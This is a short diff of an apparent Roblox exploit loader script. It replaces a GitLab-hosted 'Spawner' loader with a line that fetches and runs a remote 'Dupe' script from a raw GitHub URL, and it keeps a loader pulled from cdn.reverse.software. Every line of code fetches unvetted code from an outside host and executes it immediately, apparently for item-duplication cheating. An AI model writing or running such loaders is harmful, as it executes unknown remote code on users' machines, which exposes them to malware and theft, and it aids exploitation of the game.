@@ -1,4 +1,3 @@
 ID="7c06e757-484c-44c1-a03a-a7b29024d55e";
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
-local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-Spawner.Load()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zynxrm/Dupe/refs/heads/main/main"))()
